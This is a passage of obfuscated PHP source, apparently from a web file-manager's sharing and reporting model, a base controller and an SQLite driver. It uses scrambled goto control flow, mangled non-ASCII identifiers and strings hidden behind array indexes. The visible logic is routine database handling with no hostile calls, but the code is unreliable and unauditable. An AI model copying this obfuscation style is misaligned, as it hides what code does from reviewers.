$cÕƒ¦å‘Í) { $dõ“»˜²íŠ = SourceModel::TYPE_USER; if ($cÕƒ¦å‘Í[$C×·…‚Ê™©[406]] == SourceModel::TYPE_GROUP) { $dõ“»˜²íŠ = SourceModel::TYPE_GROUP; } $f¿óÆ”ôÀÌ = array($C×·…‚Ê™©[482] => $dè¸çì´ì, $C×·…‚Ê™©[406] => $dõ“»˜²íŠ, $C×·…‚Ê™©[498] => intval($cÕƒ¦å‘Í[$C×·…‚Ê™©[498]]), $C×·…‚Ê™©[1819] => 0, $C×·…‚Ê™©[1873] => -1); if ($cÕƒ¦å‘Í[$C×·…‚Ê™©[1819]]) { $f¿óÆ”ôÀÌ[$C×·…‚Ê™©[1819]] = $cÕƒ¦å‘Í[$C×·…‚Ê™©[1819]]; } else { if ($cÕƒ¦å‘Í[$C×·…‚Ê™©[1873]]) { $f¿óÆ”ôÀÌ[$C×·…‚Ê™©[1873]] = $cÕƒ¦å‘Í[$C×·…‚Ê™©[1873]]; } } $F—Ê¦…‡Â¾[] = $f¿óÆ”ôÀÌ; } goto AÂ‚ÛÜæ; AÂ‚ÛÜæ: return $c™¤‹¥¢‹â->addAll($F—Ê¦…‡Â¾, array(), !0); goto B¯†Ö“†ÇÁ; B¯†Ö“†ÇÁ: } public function numViewAdd($B ¾šòàĞ‡) { $aùµ¯ö¦Ù¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Fİ´„µéËè = array($aùµ¯ö¦Ù¡[481] => $B ¾šòàĞ‡); $this->where($Fİ´„µéËè)->setAdd($aùµ¯ö¦Ù¡[1870]); } public function numDownloadAdd($fŞŠÔºˆŠ¨) { $D¨†‚Ø†âù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c“çœò…×Ë = array($D¨†‚Ø†âù[481] => $fŞŠÔºˆŠ¨); $this->where($c“çœò…×Ë)->setAdd($D¨†‚Ø†âù[1871]); } protected function shareEdit($eÆ†ËºÎ‡, $F®—ø‹ÎÀó) { goto A©ŠÃ¬»Õ’; B’»Ç¼‘: if (isset($F®—ø‹ÎÀó[$BêÓè·Óß¦[1863]])) { $this->_shareAuthSet($eÆ†ËºÎ‡, $F®—ø‹ÎÀó[$BêÓè·Óß¦[1863]]); } return !0; goto b™Øâ…“¤; AÇ°ƒÖ¼¦‚: $this->_checkLinkShare($F®—ø‹ÎÀó, $C´ø›ñ–¹Ü); $B¢ŒÖ‰á = array(); $cÚÆ…¤¥ªñ = explode($BêÓè·Óß¦[47], $BêÓè·Óß¦[1874]); goto bì‰”Á¸¢…; A©ŠÃ¬»Õ’: $BêÓè·Óß¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C´ø›ñ–¹Ü = $this->getInfo($eÆ†ËºÎ‡); if (!$C´ø›ñ–¹Ü) { return !1; } goto AÇ°ƒÖ¼¦‚; bì‰”Á¸¢…: foreach ($cÚÆ…¤¥ªñ as $BùŠËßÍä) { if (!array_key_exists($BùŠËßÍä, $F®—ø‹ÎÀó)) { continue; } $B¢ŒÖ‰á[$BùŠËßÍä] = $F®—ø‹ÎÀó[$BùŠËßÍä]; } $this->shareEventAdd($C´ø›ñ–¹Ü[$BêÓè·Óß¦[397]], $F®—ø‹ÎÀó, $BêÓè·Óß¦[1686]); $this->where(array($BêÓè·Óß¦[481] => $eÆ†ËºÎ‡))->save($B¢ŒÖ‰á); goto B’»Ç¼‘; b™Øâ…“¤: } private function _checkLinkShare($DÀÖ‚ìåÅÎ, $BÎ¾ğÁôêÖ) { goto E–Ò²ƒÈŒ; AÜƒÚíƒÄÀ: $D¼Şë‹ñ÷ = $this->shareFileMeta($f˜¡ñÃí‹Ç[$f²ƒÏÂ«˜Í[461]]); if (isset($D¼Şë‹ñ÷[$f²ƒÏÂ«˜Í[372]]) && $D¼Şë‹ñ÷[$f²ƒÏÂ«˜Í[372]] == $f²ƒÏÂ«˜Í[87]) { show_json(LNG($f²ƒÏÂ«˜Í[1877]), !1); } goto b×åé²£æÙ; dÕØ± ™°§: if ($BÎ¾ğÁôêÖ[$f²ƒÏÂ«˜Í[85]][$f²ƒÏÂ«˜Í[29]] != $f²ƒÏÂ«˜Í[193]) { $c…É¿°Ïã§ = $this->_folderReport($c½Èã‡’ ™); if (!$c…É¿°Ïã§) { return; } show_json(LNG($f²ƒÏÂ«˜Í[1875]) . $f²ƒÏÂ«˜Í[1876] . $c…É¿°Ïã§, !1); } $f˜¡ñÃí‹Ç = Model($f²ƒÏÂ«˜Í[813])->fileInfoGet($BÎ¾ğÁôêÖ[$f²ƒÏÂ«˜Í[85]][$f²ƒÏÂ«˜Í[397]]); if (!$f˜¡ñÃí‹Ç) { return; } goto AÜƒÚíƒÄÀ; E–Ò²ƒÈŒ: $f²ƒÏÂ«˜Í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($DÀÖ‚ìåÅÎ[$f²ƒÏÂ«˜Í[487]] != $f²ƒÏÂ«˜Í[87]) { return; } $c½Èã‡’ ™ = $BÎ¾ğÁôêÖ[$f²ƒÏÂ«˜Í[85]][$f²ƒÏÂ«˜Í[397]]; goto dÕØ± ™°§; b×åé²£æÙ: } private function _folderReport($FªÕ­ºÖÂ) { goto EŸõ½¹Éí²; c„Ìİ„‚÷×: $fÀ‡¸™‹ËØ = array_to_keyvalue($bİÆ¸ñÚ„’, $D¦Ë¤‰â[33], $D¦Ë¤‰â[28]); $fÀ‡¸™‹ËØ[] = $D¥‰¥®•«§[$D¦Ë¤‰â[28]]; return implode($D¦Ë¤‰â[8], $fÀ‡¸™‹ËØ); goto Aõ––©¯¾ø; EÉÌš¾¼ç©: $bÉ”©²¥£ = substr($D¥‰¥®•«§[$D¦Ë¤‰â[515]], strpos($D¥‰¥®•«§[$D¦Ë¤‰â[515]], $D…Òµ—‹)); $aòĞÃÛÀ÷ = array($D¦Ë¤‰â[397] => array($D¦Ë¤‰â[7], trim($bÉ”©²¥£, $D¦Ë¤‰â[47]))); $bİÆ¸ñÚ„’ = Model($D¦Ë¤‰â[813])->where($aòĞÃÛÀ÷)->field($D¦Ë¤‰â[28])->select(); goto c„Ìİ„‚÷×; A¯Õˆˆá‘: if (!$dº÷ÙÓË´¦) { return !1; } $dº÷ÙÓË´¦ = array_to_keyvalue($dº÷ÙÓË´¦, $D¦Ë¤‰â[33], $D¦Ë¤‰â[461]); $D…Òµ—‹ = $D¦Ë¤‰â[47] . $FªÕ­ºÖÂ . $D¦Ë¤‰â[47]; goto aªÂºßé; EŸõ½¹Éí²: $D¦Ë¤‰â =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aòĞÃÛÀ÷ = array($D¦Ë¤‰â[461] => array($D¦Ë¤‰â[992], 0), $D¦Ë¤‰â[731] => 3); $dº÷ÙÓË´¦ = Model($D¦Ë¤‰â[1878])->where($aòĞÃÛÀ÷)->field($D¦Ë¤‰â[461])->select(); goto A¯Õˆˆá‘; aªÂºßé: $aòĞÃÛÀ÷ = array($D¦Ë¤‰â[461] => array($D¦Ë¤‰â[7], $dº÷ÙÓË´¦), $D¦Ë¤‰â[515] => array($D¦Ë¤‰â[381], "\x25{$D…Òµ—‹}\x25"), $D¦Ë¤‰â[425] => 0); $D¥‰¥®•«§ = Model($D¦Ë¤‰â[813])->where($aòĞÃÛÀ÷)->field($D¦Ë¤‰â[1879])->find(); if (!$D¥‰¥®•«§) { return !1; } goto EÉÌš¾¼ç©; Aõ––©¯¾ø: } protected function remove($DÉíªÙˆ¿Ø) { goto f·÷ã†; cÇ±Ñ®ßàõ: $A£¹ï™®Í» = $this->where($fğ‡ƒìš‚ˆ)->delete(); if ($A£¹ï™®Í») { Model($AöÑÂáµæ“[590])->where(array($AöÑÂáµæ“[482] => $DÉíªÙˆ¿Ø))->delete(); } $C‰íøŒÇ = is_array($DÉíªÙˆ¿Ø) ? $DÉíªÙˆ¿Ø[1] : array($DÉíªÙˆ¿Ø); goto dœ²ëë¿ö; dœ²ëë¿ö: for ($aŒÍ‹É®°´ = 0; $aŒÍ‹É®°´ < count($C‰íøŒÇ); $aŒÍ‹É®°´++) { $Aê‘ñ¦Ø©° = $this->getInfo($C‰íøŒÇ[$aŒÍ‹É®°´]); if ($Aê‘ñ¦Ø©°[$AöÑÂáµæ“[489]] == $AöÑÂáµæ“[87]) { Model($AöÑÂáµæ“[558])->eventShare($Aê‘ñ¦Ø©°[$AöÑÂáµæ“[397]], $AöÑÂáµæ“[1868]); } if ($Aê‘ñ¦Ø©°[$AöÑÂáµæ“[487]] == $AöÑÂáµæ“[87]) { Model($AöÑÂáµæ“[558])->eventShare($Aê‘ñ¦Ø©°[$AöÑÂáµæ“[397]], $AöÑÂáµæ“[1867]); } } return $A£¹ï™®Í»; goto f¡÷é³®‡á; f·÷ã†: $AöÑÂáµæ“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($DÉíªÙˆ¿Ø)) { $DÉíªÙˆ¿Ø = array($AöÑÂáµæ“[7], $DÉíªÙˆ¿Ø); } $fğ‡ƒìš‚ˆ = array($AöÑÂáµæ“[482] => $DÉíªÙˆ¿Ø); goto cÇ±Ñ®ßàõ; f¡÷é³®‡á: } protected function removeBySource($E…»¼Ù¯â„) { goto dçŸØÏí¼; dóßòÇ¦ÎÇ: $aé¤¯ËİÖŞ = array_to_keyvalue($aé¤¯ËİÖŞ, $CáƒøˆŠÉ[33], $CáƒøˆŠÉ[482]); if (!$aé¤¯ËİÖŞ) { return; } $BËÚÅäİ¨µ = array($CáƒøˆŠÉ[481] => array($CáƒøˆŠÉ[413], $aé¤¯ËİÖŞ)); goto C‡Óˆˆ¼; dçŸØÏí¼: $CáƒøˆŠÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BËÚÅäİ¨µ = array($CáƒøˆŠÉ[412] => array($CáƒøˆŠÉ[413], $E…»¼Ù¯â„)); $aé¤¯ËİÖŞ = $this->field($CáƒøˆŠÉ[482])->where($BËÚÅäİ¨µ)->select(); goto dóßòÇ¦ÎÇ; C‡Óˆˆ¼: $this->where($BËÚÅäİ¨µ)->delete(); Model($CáƒøˆŠÉ[590])->where($BËÚÅäİ¨µ)->delete(); goto B±¡¶§ŠÉª; B±¡¶§ŠÉª: } public function listAll($Fº°äÜ„ğ) { goto f³À„ÊÂ¶ß; Cëœ„£œµ: if ($Fº°äÜ„ğ[$A·»­¶Â÷«[742]]) { $c÷Ù¦ÈÆ× = $Fº°äÜ„ğ[$A·»­¶Â÷«[490]] ? $Fº°äÜ„ğ[$A·»­¶Â÷«[490]] : strtotime(date($A·»­¶Â÷«[1880])); $C¼¶•‡Ã‰÷[$A·»­¶Â÷«[194]] = array($A·»­¶Â÷«[331], array($Fº°äÜ„ğ[$A·»­¶Â÷«[742]], $c÷Ù¦ÈÆ×)); } if ($Fº°äÜ„ğ[$A·»­¶Â÷«[29]]) { $C¼¶•‡Ã‰÷[$Fº°äÜ„ğ[$A·»­¶Â÷«[29]]] = 1; } else { $C¼¶•‡Ã‰÷[] = array($A·»­¶Â÷«[487] => array($A·»­¶Â÷«[992], 0), $A·»­¶Â÷«[489] => array($A·»­¶Â÷«[992], 0), $A·»­¶Â÷«[1857] => $A·»­¶Â÷«[1811]); } if ($Fº°äÜ„ğ[$A·»­¶Â÷«[1807]]) { $C¼¶•‡Ã‰÷[] = array($A·»­¶Â÷«[484] => $Fº°äÜ„ğ[$A·»­¶Â÷«[1807]], $A·»­¶Â÷«[1451] => array($A·»­¶Â÷«[381], "\x25{$Fº°äÜ„ğ[$A·»­¶Â÷«[1807]]}\45"), $A·»­¶Â÷«[1857] => $A·»­¶Â÷«[1811]); } goto fËöää¨ø; f³À„ÊÂ¶ß: $A·»­¶Â÷« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¼¶•‡Ã‰÷ = array(); if ($Fº°äÜ„ğ[$A·»­¶Â÷«[1550]]) { $C¼¶•‡Ã‰÷[$A·»­¶Â÷«[1550]] = $Fº°äÜ„ğ[$A·»­¶Â÷«[1550]]; } goto Cëœ„£œµ; fËöää¨ø: $aÌ¼‘Õ· = $this->_makeOrder()->where($C¼¶•‡Ã‰÷)->selectPage(20); if (empty($aÌ¼‘Õ·[$A·»­¶Â÷«[367]])) { return array(); } $this->_listDataApply($aÌ¼‘Õ·[$A·»­¶Â÷«[367]]); goto D¿Ú†•ãğ; D¿Ú†•ãğ: return $aÌ¼‘Õ·; goto D…ˆê»ÛÀ; D…ˆê»ÛÀ: } public function listDataApply($b¯ÓØƒ˜å) { $this->_listDataApply($b¯ÓØƒ˜å); return $b¯ÓØƒ˜å; } private function _listDataApply(&$bÎ³‰›Øø‘) { goto B½¹•´ÏŠ‰; e •ÚÑù„Ô: $dê¨¤ŒÂáÌ = array_to_keyvalue($bÎ³‰›Øø‘, $e¬‰¼¾–²•[33], $e¬‰¼¾–²•[397]); $b½´ïä†Šñ = Model($e¬‰¼¾–²•[813])->sourceListInfo($dê¨¤ŒÂáÌ, !0); foreach ($bÎ³‰›Øø‘ as $eô©ŸƒÇÂõ => &$A˜©Şõ«¡) { $b©¨ÜÀá = $A˜©Şõ«¡[$e¬‰¼¾–²•[1550]]; $A˜©Şõ«¡[$e¬‰¼¾–²•[1881]] = $bë¯¡­•[$b©¨ÜÀá] ? $bë¯¡­•[$b©¨ÜÀá] : !1; $EâÒ·ÎĞ«Ü = $A˜©Şõ«¡[$e¬‰¼¾–²•[397]]; $A˜©Şõ«¡[$e¬‰¼¾–²•[85]] = $b½´ïä†Šñ[$EâÒ·ÎĞ«Ü] ? $b½´ïä†Šñ[$EâÒ·ÎĞ«Ü] : !1; if ($A˜©Şõ«¡[$e¬‰¼¾–²•[85]][$e¬‰¼¾–²•[425]] == $e¬‰¼¾–²•[87]) { unset($bÎ³‰›Øø‘[$eô©ŸƒÇÂõ]); } if ($A˜©Şõ«¡[$e¬‰¼¾–²•[85]] != $e¬‰¼¾–²•[191] && !$A˜©Şõ«¡[$e¬‰¼¾–²•[85]]) { unset($bÎ³‰›Øø‘[$eô©ŸƒÇÂõ]); } } goto c«Ø©ê‡ù™; B½¹•´ÏŠ‰: $e¬‰¼¾–²• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E±Ÿ·¥¢Ÿ = array_to_keyvalue($bÎ³‰›Øø‘, $e¬‰¼¾–²•[33], $e¬‰¼¾–²•[1550]); $bë¯¡­• = Model($e¬‰¼¾–²•[532])->userListInfo(array_unique($E±Ÿ·¥¢Ÿ)); goto e •ÚÑù„Ô; c«Ø©ê‡ù™: unset($A˜©Şõ«¡); $bÎ³‰›Øø‘ = array_values($bÎ³‰›Øø‘); goto b¨×°ä…¡; b¨×°ä…¡: } private function _makeOrder($A†®±£Ÿ–Ô = '') { goto B‡¨Û½¥É; B‡¨Û½¥É: $Cù‚ùªÁ¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D•¶ëœ×… = array($Cù‚ùªÁ¥[194], $Cù‚ùªÁ¥[490], $Cù‚ùªÁ¥[1870], $Cù‚ùªÁ¥[1871]); $Eƒö·Ÿ¹‹æ = array($Cù‚ùªÁ¥[442] => $Cù‚ùªÁ¥[443], $Cù‚ùªÁ¥[444] => $Cù‚ùªÁ¥[445]); goto bäŸÎ Ú›´; E±›ÁòòŒ–: $A†®±£Ÿ–Ô = $A†®±£Ÿ–Ô . "{$fÓœİù’ÈÀ}\x20{$Aô¸ÄÊÜ†}"; return $this->order($A†®±£Ÿ–Ô); goto EÅÉÓ’À³é; bäŸÎ Ú›´: $fÓœİù’ÈÀ = Input::get($Cù‚ùªÁ¥[449], $Cù‚ùªÁ¥[7], $Cù‚ùªÁ¥[418], $D•¶ëœ×…); $Aô¸ÄÊÜ† = Input::get($Cù‚ùªÁ¥[450], $Cù‚ùªÁ¥[7], $Cù‚ùªÁ¥[1882], array($Cù‚ùªÁ¥[1806], $Cù‚ùªÁ¥[444])); $Aô¸ÄÊÜ† = $Eƒö·Ÿ¹‹æ[$Aô¸ÄÊÜ†]; goto E±›ÁòòŒ–; EÅÉÓ’À³é: } public function reportAdd($d®ÆèÂêÅ˜) { $AÂÓ—ÚÅ¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¡—´è¶®È = array($AÂÓ—ÚÅ¶[482] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[482]], $AÂÓ—ÚÅ¶[1550] => USER_ID); if (Model($AÂÓ—ÚÅ¶[1878])->where($f¡—´è¶®È)->find()) { return !1; } $Fµœ‚‚‰Åë = array($AÂÓ—ÚÅ¶[482] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[482]], $AÂÓ—ÚÅ¶[1451] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[1451]], $AÂÓ—ÚÅ¶[397] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[397]], $AÂÓ—ÚÅ¶[461] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[461]], $AÂÓ—ÚÅ¶[1550] => USER_ID, $AÂÓ—ÚÅ¶[29] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[29]], $AÂÓ—ÚÅ¶[445] => $d®ÆèÂêÅ˜[$AÂÓ—ÚÅ¶[445]]); return Model($AÂÓ—ÚÅ¶[1878])->add($Fµœ‚‚‰Åë); } public function reportList($E”õ»††´ñ) { goto bÀŒñåË¨í; BªŞ§ŠÏ›ó: $aØ¹×Û£Æ¦ = array($A‰ß÷ç›ÈÀ[442] => $A‰ß÷ç›ÈÀ[443], $A‰ß÷ç›ÈÀ[444] => $A‰ß÷ç›ÈÀ[445]); $C ×„È¦Œ… = $A‰ß÷ç›ÈÀ[1886] . $aØ¹×Û£Æ¦[$CÊõƒÀ¹¬¼]; $Eæé˜£õó = Model($A‰ß÷ç›ÈÀ[1878])->where($d×­ˆÏ¸‰õ)->order($C ×„È¦Œ…)->selectPage(20); goto F¨ßè±õÚ; bÀŒñåË¨í: $A‰ß÷ç›ÈÀ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d×­ˆÏ¸‰õ = array(); if ($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[742]]) { $e²ººª†ÄÃ = $E”õ»††´ñ[$A‰ß÷ç›ÈÀ[490]] ? $E”õ»††´ñ[$A‰ß÷ç›ÈÀ[490]] : strtotime(date($A‰ß÷ç›ÈÀ[1880])); $d×­ˆÏ¸‰õ[$A‰ß÷ç›ÈÀ[194]] = array($A‰ß÷ç›ÈÀ[331], array($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[742]], $e²ººª†ÄÃ)); } goto c«´ÙÔ‚ùã; F¨ßè±õÚ: if (empty($Eæé˜£õó[$A‰ß÷ç›ÈÀ[367]])) { return array(); } $fÇ±‹À¯¬­ = array_to_keyvalue_group($Eæé˜£õó[$A‰ß÷ç›ÈÀ[367]], $A‰ß÷ç›ÈÀ[731], $A‰ß÷ç›ÈÀ[482]); if (!empty($fÇ±‹À¯¬­[0])) { $E”õ»††´ñ = $fÇ±‹À¯¬­[0]; $d×­ˆÏ¸‰õ = array($A‰ß÷ç›ÈÀ[482] => array($A‰ß÷ç›ÈÀ[7], $E”õ»††´ñ)); $a¨Ñòíõ§º = $this->where($d×­ˆÏ¸‰õ)->field($A‰ß÷ç›ÈÀ[482])->select(); $a¨Ñòíõ§º = array_to_keyvalue($a¨Ñòíõ§º, $A‰ß÷ç›ÈÀ[33], $A‰ß÷ç›ÈÀ[482]); $fò†¢Ø¤ñì = array_diff($E”õ»††´ñ, $a¨Ñòíõ§º); if (!empty($fò†¢Ø¤ñì)) { foreach ($Eæé˜£õó[$A‰ß÷ç›ÈÀ[367]] as $dÔİğô•“ => $däí¨İ»³Ç) { if (in_array($däí¨İ»³Ç[$A‰ß÷ç›ÈÀ[482]], $fò†¢Ø¤ñì)) { unset($Eæé˜£õó[$A‰ß÷ç›ÈÀ[367]][$dÔİğô•“]); } } } } goto eçÔ‚×°Ç; eçÔ‚×°Ç: $this->_listDataApply($Eæé˜£õó[$A‰ß÷ç›ÈÀ[367]]); return $Eæé˜£õó; goto eÉáæîõô; c«´ÙÔ‚ùã: if (isset($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[29]]) && in_array($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[29]], array($A‰ß÷ç›ÈÀ[87], $A‰ß÷ç›ÈÀ[429], $A‰ß÷ç›ÈÀ[1883], $A‰ß÷ç›ÈÀ[1884], $A‰ß÷ç›ÈÀ[1885]))) { $d×­ˆÏ¸‰õ[$A‰ß÷ç›ÈÀ[29]] = $E”õ»††´ñ[$A‰ß÷ç›ÈÀ[29]]; } if (isset($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[731]]) && in_array($E”õ»††´ñ[$A‰ß÷ç›ÈÀ[731]], array($A‰ß÷ç›ÈÀ[191], $A‰ß÷ç›ÈÀ[87], $A‰ß÷ç›ÈÀ[429], $A‰ß÷ç›ÈÀ[1883]))) { $d×­ˆÏ¸‰õ[$A‰ß÷ç›ÈÀ[731]] = $E”õ»††´ñ[$A‰ß÷ç›ÈÀ[731]]; } $CÊõƒÀ¹¬¼ = Input::get($A‰ß÷ç›ÈÀ[450], $A‰ß÷ç›ÈÀ[7], $A‰ß÷ç›ÈÀ[1882], array($A‰ß÷ç›ÈÀ[1806], $A‰ß÷ç›ÈÀ[444])); goto BªŞ§ŠÏ›ó; eÉáæîõô: } public function reportStatus($FÚÛì÷äŠç) { goto EˆƒÕ¬–³Ñ; EˆƒÕ¬–³Ñ: $d¾ĞŒ¸ÏÅ² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A¶•äéö = array($d¾ĞŒ¸ÏÅ²[395] => $FÚÛì÷äŠç[$d¾ĞŒ¸ÏÅ²[395]]); $d®´ÉÕáê = Model($d¾ĞŒ¸ÏÅ²[1878])->where($A¶•äéö)->field($d¾ĞŒ¸ÏÅ²[1887])->find(); goto Fˆ¦ç„©åô; eš­£Ó´¤ø: return $e§¬õËà‡÷; goto DˆˆÑ˜¢¹”; Bˆâ×ùğ¨ë: $e§¬õËà‡÷ = Model($d¾ĞŒ¸ÏÅ²[1878])->where($A¶•äéö)->save($E§¦ÑÛÅ¦Ÿ); if ($FÚÛì÷äŠç[$d¾ĞŒ¸ÏÅ²[731]] == $d¾ĞŒ¸ÏÅ²[429]) { if ($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[461]] != $d¾ĞŒ¸ÏÅ²[191] && $this->shareFileMeta($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[461]])) { $this->shareFileMeta($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[461]], 0); } $this->remove($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[482]]); return !0; } if ($e§¬õËà‡÷ && $FÚÛì÷äŠç[$d¾ĞŒ¸ÏÅ²[731]] == $d¾ĞŒ¸ÏÅ²[1883]) { $A­£Ö‰Ú„× = $E§¦ÑÛÅ¦Ÿ[$d¾ĞŒ¸ÏÅ²[731]] == $d¾ĞŒ¸ÏÅ²[1883] ? 1 : 0; $this->shareFileMeta($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[461]], $A­£Ö‰Ú„×); $this->removeByFile($d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[461]]); } goto eš­£Ó´¤ø; Fˆ¦ç„©åô: if (!$d®´ÉÕáê) { return !1; } $E§¦ÑÛÅ¦Ÿ = array($d¾ĞŒ¸ÏÅ²[731] => $FÚÛì÷äŠç[$d¾ĞŒ¸ÏÅ²[731]]); if ($FÚÛì÷äŠç[$d¾ĞŒ¸ÏÅ²[731]] == $d¾ĞŒ¸ÏÅ²[1883] && $d®´ÉÕáê[$d¾ĞŒ¸ÏÅ²[731]] == $d¾ĞŒ¸ÏÅ²[1883]) { $E§¦ÑÛÅ¦Ÿ[$d¾ĞŒ¸ÏÅ²[731]] = 0; } goto Bˆâ×ùğ¨ë; DˆˆÑ˜¢¹”: } private function removeByFile($Bå°ùÌÃ‚Õ) { goto eÑóÈºµµÎ; dÂ’‰•ˆ·Ÿ: $F¬ÅÄòè™ = array($C“Ê™¦±é[397] => array($C“Ê™¦±é[7], $fíÚ”¿ÊŞæ), $C“Ê™¦±é[487] => 1); $fËÄîÓ·‰Á = $this->where($F¬ÅÄòè™)->field($C“Ê™¦±é[482])->select(); if (empty($fËÄîÓ·‰Á)) { return; } goto EøáŠÙ´¿; eÑóÈºµµÎ: $C“Ê™¦±é =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fËÄîÓ·‰Á = Model($C“Ê™¦±é[813])->where(array($C“Ê™¦±é[461] => $Bå°ùÌÃ‚Õ))->field($C“Ê™¦±é[397])->select(); $fíÚ”¿ÊŞæ = array_to_keyvalue($fËÄîÓ·‰Á, $C“Ê™¦±é[33], $C“Ê™¦±é[397]); goto dÂ’‰•ˆ·Ÿ; EøáŠÙ´¿: $cœ·×©¼òÑ = array_to_keyvalue($fËÄîÓ·‰Á, $C“Ê™¦±é[33], $C“Ê™¦±é[482]); $this->remove($cœ·×©¼òÑ); goto b¬²Æ—‡Úƒ; b¬²Æ—‡Úƒ: } private function shareFileMeta($D„Ò‹ŸÀ•Î, $bßî³²ò† = null) { $Fê‡ªÇ×²® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B‹¬»æ­ ë = array($Fê‡ªÇ×²®[461] => $D„Ò‹ŸÀ•Î, $Fê‡ªÇ×²®[93] => $Fê‡ªÇ×²®[1888]); if (is_null($bßî³²ò†)) { return Model($Fê‡ªÇ×²®[1889])->where($B‹¬»æ­ ë)->find(); } $B‹¬»æ­ ë[$Fê‡ªÇ×²®[372]] = $bßî³²ò†; Model($Fê‡ªÇ×²®[1889])->add($B‹¬»æ­ ë, array(), !0); } } $FèòÙñˆ§Œ = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][847]]; goto bñê×ˆÛ±Û; a¯ó±ŒÃ½: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BôñéùÑï·; BôñéùÑï·: $BÑ¹ÂÚËÆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; global $in, $config; $this->config =& $config; goto bŠ©µùÂ£; bŠ©µùÂ£: $this->in =& $in; $this->values[$BÑ¹ÂÚËÆ[6]] =& $config; $this->values[$BÑ¹ÂÚËÆ[7]] =& $in; goto fÓÄÓ¬¤è; fÓÄÓ¬¤è: $this->tpl = TEMPLATE . MOD . $BÑ¹ÂÚËÆ[8]; $this->_classObjectID = mt_rand(0, 10000); goto cè­ä²ÀÒñ; cè­ä²ÀÒñ: } public function loadClass($Dõ§¥¤ğº) { if (1 === func_num_args()) { $this->{$Dõ§¥¤ğº} = new $Dõ§¥¤ğº(); } else { $A‚Å¤§åÛ = new ReflectionClass($Dõ§¥¤ğº); $C†ÖÒÁ—ÅÄ = func_get_args(); array_shift($C†ÖÒÁ—ÅÄ); $this->{$Dõ§¥¤ğº} = $A‚Å¤§åÛ->newInstanceArgs($C†ÖÒÁ—ÅÄ); } return $this->{$Dõ§¥¤ğº}; } protected function assign($B¤„êïÖİ«, $eïöÈÌÓÇ) { $this->values[$B¤„êïÖİ«] = $eïöÈÌÓÇ; } protected function display($B¸Ï¤÷¶¤ˆ) { ob_end_clean(); extract($this->values); require $this->tpl . $B¸Ï¤÷¶¤ˆ; } } class DbSqliteBase extends Db { public function __construct($E¨®»‹Š‰÷ = '') { $A­ˆø¬ÓÇ³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!extension_loaded($A­ˆø¬ÓÇ³[9])) { think_exception(think_lang($A­ˆø¬ÓÇ³[10]) . $A­ˆø¬ÓÇ³[11]); } if (!empty($E¨®»‹Š‰÷)) { if (!isset($E¨®»‹Š‰÷[$A­ˆø¬ÓÇ³[12]])) { $E¨®»‹Š‰÷[$A­ˆø¬ÓÇ³[12]] = 438; } $this->config = $E¨®»‹Š‰÷; if (empty($this->config[$A­ˆø¬ÓÇ³[13]])) { $this->config[$A­ˆø¬ÓÇ³[13]] = array(); } } } public function connect($eõ°¶…Ğ¹â = '', $f¥à‡ÎĞ´“ = 0) { $dğóøíÊ‰• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->linkID[$f¥à‡ÎĞ´“])) { goto AÑÎÒ«­ˆì; D–’Ğ¿¨å: $this->linkID[$f¥à‡ÎĞ´“] = $e¥°“®›ñ($eõ°¶…Ğ¹â[$dğóøíÊ‰•[17]], $eõ°¶…Ğ¹â[$dğóøíÊ‰•[12]]); if (!$this->linkID[$f¥à‡ÎĞ´“]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eÃ†‚ØÀÊ; eÃ†‚ØÀÊ: @sqlite_busy_timeout($this->linkID[$f¥à‡ÎĞ´“], 30000); if (1 != think_config($dğóøíÊ‰•[18])) { unset($this->config); } goto Cô¨¥Á—; AÑÎÒ«­ˆì: if (empty($eõ°¶…Ğ¹â)) { $eõ°¶…Ğ¹â = $this->config; } $aƒÙ…Ç‘¦¹ = !empty($eõ°¶…Ğ¹â[$dğóøíÊ‰•[13]][$dğóøíÊ‰•[14]]) ? $eõ°¶…Ğ¹â[$dğóøíÊ‰•[13]][$dğóøíÊ‰•[14]] : $this->pconnect; $e¥°“®›ñ = $aƒÙ…Ç‘¦¹ ? $dğóøíÊ‰•[15] : $dğóøíÊ‰•[16]; goto D–’Ğ¿¨å; Cô¨¥Á—: } return $this->linkID[$f¥à‡ÎĞ´“]; } public function free() { $this->queryID = null; } public function query($B®Ş¬÷áˆ£) { goto aŸà‘ÚØ; fğ°ÁêÚ¸’: think_status($D³òñ„‚«Ö[20]); $this->queryID = sqlite_query($this->_linkID, 